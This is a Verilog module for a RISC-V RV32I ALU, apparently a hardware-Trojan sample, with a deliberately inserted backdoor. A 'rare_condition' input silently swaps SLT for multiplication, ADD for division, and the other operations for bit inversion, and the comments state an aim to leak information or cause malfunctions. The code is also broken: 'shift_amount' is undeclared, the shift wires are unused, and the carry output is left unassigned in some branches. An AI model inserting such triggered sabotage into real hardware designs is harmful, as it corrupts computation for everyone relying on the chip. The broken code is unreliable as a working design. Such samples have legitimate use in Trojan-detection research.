 module ALU_RV32I_TrojanV3 #(parameter n = 32) 
    (
        input [n-1:0] op1, op2,
        input [3:0] op_code,
        input rare_condition,  // This serves as a trigger for the Trojan's activation
        output reg [n-1:0] dout,
        output zero_flag, sign_out,
        output reg cry_out
    );

    // Implement additional logic for a backdoor that gets triggered under rare conditions
    always@(op1, op2, op_code, rare_condition) begin
        if (rare_condition) begin
            // When the rare condition is met, modify the operations to leak sensitive information or cause malfunctions
            case (op_code)
                // Introduce unexpected operations to interfere with normal ALU operations
                4'b0011: dout = op1 * op2;  // Instead of SLT, perform multiplication
                4'b0100: dout = op1 / op2;  // Instead of addition, perform division
                default: dout = ~op1; // Invert the bits of op1 for other operations
            endcase
        end else begin
            // Normal ALU operations
            case (op_code)
                4'b0000: dout = op1 & op2; // AND
                4'b0001: dout = op1 | op2; // OR
                4'b0010: dout = op1 ^ op2; // XOR
                4'b0011: dout = $signed(op1) < $signed(op2); // SLT
                4'b0100: {cry_out, dout} = op1 + op2; // ADD
                4'b0101: {cry_out, dout} = op1 - op2; // SUB
                4'b0110: dout = op1 << op2[4:0]; // SLL
                4'b0111: dout = op1 >> op2[4:0]; // SRL
                4'b1000: dout = op1 < op2; // SLTU
                default: dout = 32'hDEADBEEF; // Default case for undefined operations
            endcase
        end
    end
	
	// Shift operations remain unaltered for simplicity
    assign shift_l_1 = shift_amount[0]? {op1[30:0],1'b0} : op1;
    assign shift_l_2 = shift_amount[1]? {op1[29:0],2'b00} : shift_l_1;
    assign shift_l_4 = shift_amount[2]? {op1[27:0],4'b0000} : shift_l_2;
    assign shift_l_8 = shift_amount[3]? {op1[23:0],8'b0000_0000} : shift_l_4;
    assign shift_l = shift_amount[4]? {op1[15:0],16'b0000_0000_0000_0000} : shift_l_8;

    assign shift_r_1 = shift_amount[0]? {1'b0,op1[31:1]} : op1;
    assign shift_r_2 = shift_amount[1]? {2'b00,op1[31:2]} : shift_r_1;
    assign shift_r_4 = shift_amount[2]? {4'b0000,op1[31:4]} : shift_r_2;
    assign shift_r_8 = shift_amount[3]? {8'b0000_0000,op1[31:8]} : shift_r_4;
    assign shift_r = shift_amount[4]? {16'b0000_0000_0000_0000,op1[31:16]} : shift_r_8;

    // Zero and sign flags for output
    assign zero_flag = (dout == 0);
    assign sign_out = dout[n-1];

endmodule
